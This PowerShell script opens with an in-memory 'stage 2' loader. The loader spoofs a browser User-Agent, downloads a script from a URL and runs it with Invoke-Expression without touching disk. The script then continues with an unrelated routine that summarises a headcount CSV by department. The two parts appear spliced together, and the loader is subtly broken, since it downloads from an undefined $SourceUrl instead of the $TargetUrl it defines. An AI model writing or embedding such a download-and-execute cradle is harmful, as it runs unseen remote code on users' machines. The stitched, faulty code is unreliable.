<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.

.EXAMPLE
    PS> .\loader.ps1
#>
$TargetUrl = 'https://localhost:9001/stage2.ps1'
$TimeoutSec = 154
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $PayloadText = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($PayloadText)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $PayloadText.Length)
    Invoke-Expression $PayloadText
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 23 reached"
$InputCsv = 'C:\Scripts\data\headcount-export.csv'
$OutputPath = "D:\Ops\reports\headcount-summary-2024-08-16.csv"
$GroupBy = "Department"
$MinAmount = 5000


if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','

$byGroup = $rows | Group-Object -Property Department | ForEach-Object {
    [pscustomobject]@{
        Department       = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}

$byGroup | Sort-Object -Property Total -Descending |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Rows: {0} | Groups: {1}" -f @($rows).Count, @($byGroup).Count) -ForegroundColor Cyan
